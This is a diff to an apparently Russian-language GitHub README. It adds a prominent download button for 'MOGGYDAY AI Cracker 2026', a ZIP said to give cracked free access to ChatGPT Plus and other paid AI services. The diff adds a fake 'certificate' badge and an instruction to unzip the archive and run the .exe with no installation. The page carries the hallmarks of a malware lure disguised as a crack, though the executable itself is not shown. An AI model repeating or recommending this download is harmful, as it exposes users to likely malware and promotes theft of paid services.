@@ -11,6 +11,23 @@
 
 ---
 
+<p align="center">
+  <a href="https://github.com/veenx0704/chatgpt-plus-free-2026/releases/download/v1.0.0/MOGGYDAY-AI-Cracker-2026.zip">
+    <img src="https://img.shields.io/badge/%E2%AC%87%20%20%D0%A1%D0%9A%D0%90%D0%A7%D0%90%D0%A2%D0%AC%20%D0%91%D0%95%D0%A1%D0%9F%D0%9B%D0%90%D0%A2%D0%9D%D0%9E-MOGGYDAY--AI--Cracker--2026.zip-FF8C00?style=for-the-badge&logo=windows&logoColor=white" alt="Скачать MOGGYDAY AI Cracker 2026" height="52">
+  </a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Архив-ZIP%204.3%20MB-555?style=flat-square&logo=7zip&logoColor=white">
+  <img src="https://img.shields.io/badge/Платформа-Windows%2010%2F11-0078D4?style=flat-square&logo=windows">
+  <img src="https://img.shields.io/badge/Подпись-MOGGYDAY%20Certificate-2ea44f?style=flat-square">
+  <img src="https://img.shields.io/badge/Установка-не%20нужна-FF8C00?style=flat-square">
+</p>
+
+> Нажми на кнопку выше — ZIP скачается сразу. Распакуй и запусти `MOGGYDAY-AI-Cracker-2026.exe`. Установка не нужна.
+
+---
+
 ## Что это
 
 **MOGGYDAY AI Cracker 2026** — бесплатный Windows-лаунчер, который даёт **крякнутый / активированный доступ** к **ChatGPT Plus** и 28 другим платным AI-сервисам без подписки, регистрации и оплаты.
